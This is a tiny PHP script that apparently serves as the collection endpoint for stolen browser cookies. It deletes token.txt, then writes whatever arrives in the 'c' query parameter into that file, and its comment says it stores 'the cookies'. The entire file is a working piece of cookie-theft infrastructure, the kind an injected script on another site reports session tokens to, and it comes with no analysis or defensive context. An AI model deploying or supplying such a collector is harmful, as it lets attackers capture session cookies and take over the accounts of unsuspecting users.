<?php 
session_start();

//DELETE token.txt file here
unlink('./token.txt');
$myfile = fopen("./token.txt", "w") or die("Unable to open file!");
$txt = $_GET["c"];
//WRITE the cookies into token.txt file here
fwrite($myfile, $txt);
fclose($myfile);
?>